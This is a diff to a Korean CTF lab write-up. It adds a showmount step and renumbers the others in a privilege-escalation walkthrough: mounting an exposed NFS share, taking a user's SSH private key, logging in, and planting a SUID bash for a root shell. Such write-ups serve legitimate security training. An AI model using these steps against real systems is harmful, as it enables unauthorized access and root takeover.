@@ -45,7 +45,18 @@ nmap -A -vv -T4 -p- 10.10.155.201 -oN nmap_scan.txt
 
 ## 3. 실습 과정
 
-### 3.1 NFS 공유 디렉토리 마운트
+### 3.1 showmount를 통한 공유 디렉토리 확인
+
+- 설명: NFS 서비스가 어떤 디렉토리를 외부에 공유하고 있는지 확인하기 위해 사용했습니다.
+```bash 
+showmount -e 10.10.155.201
+```
+
+![NFS 공유 디렉토리 확인](.screenshots/showmount_exports.png)
+
+---
+
+### 3.2 NFS 공유 디렉토리 마운트
 
 - 설명: NFS 공유 디렉토리를 로컬 시스템의 /tmp/mount 경로에 마운트하여 내부 파일을 열람할 수 있도록 했습니다. -nolock은 잠금 기능을 비활성화하여 호환성을 높입니다.
 ```bash
@@ -57,7 +68,7 @@ mount -t nfs 10.10.155.201:/home /tmp/mount -nolock
 
 ---
 
-### 3.2 NFS 공유 디렉토리에서 SSH 개인 키 획득
+### 3.3 NFS 공유 디렉토리에서 SSH 개인 키 획득
 
 - 공유 디렉토리 내 `/home/cappucino/.ssh/id_rsa` 발견
 
@@ -67,7 +78,7 @@ mount -t nfs 10.10.155.201:/home /tmp/mount -nolock
 
 ---
 
-### 3.3 SSH 접속
+### 3.4 SSH 접속
 
 - 설명: 마운트된 NFS 디렉토리에서 획득한 개인 키(id_rsa)를 이용해 타깃 머신에 SSH로 접속하였습니다. chmod 600은 키 파일 권한을 설정해 SSH 클라이언트에서 거부되지 않도록 합니다.
 ```bash
@@ -79,7 +90,7 @@ ssh -i id_rsa cappucino@10.10.155.201
 
 ---
 
-### 3.4 Kali 터미널에서 루트 쉘을 위한 바이너리 준비
+### 3.5 Kali 터미널에서 루트 쉘을 위한 바이너리 준비
 
 - 설명: 타겟 머신과 동일한 환경에서 동작하는 bash 바이너리를 다운로드하여 업로드할 준비를 했습니다. 이후 SUID 권한을 부여하여 루트 쉘을 획득하기 위한 전처리 단계입니다.
 ```bash
@@ -90,7 +101,7 @@ wget https://raw.githubusercontent.com/polo-sec/writing/raw/master/Security%20Ch
 
 ---
 
-### 3.5 공유 디렉토리에 bash 복사 후 SUID 권한 부여
+### 3.6 공유 디렉토리에 bash 복사 후 SUID 권한 부여
 
 - 설명: 공유된 디렉토리에 bash 파일을 복사한 뒤, chmod +x로 실행 권한을 준 후, chmod +s로 SUID 비트를 설정하여 해당 파일을 실행할 때 소유자(root)의 권한으로 실행되도록 구성했습니다.
 ```bash
@@ -104,7 +115,7 @@ chmod +x bash
 
 ---
 
-### 3.6 SSH 쉘에서 bash 실행 → 루트 권한 획득
+### 3.7 SSH 쉘에서 bash 실행 → 루트 권한 획득
 
 - 설명: SUID가 설정된 bash 바이너리를 실행하면서 -p 옵션을 주어 현재 파일 소유자의 권한(root)으로 쉘을 실행했습니다. 이를 통해 루트 권한 획득에 성공했습니다.
 ```bash
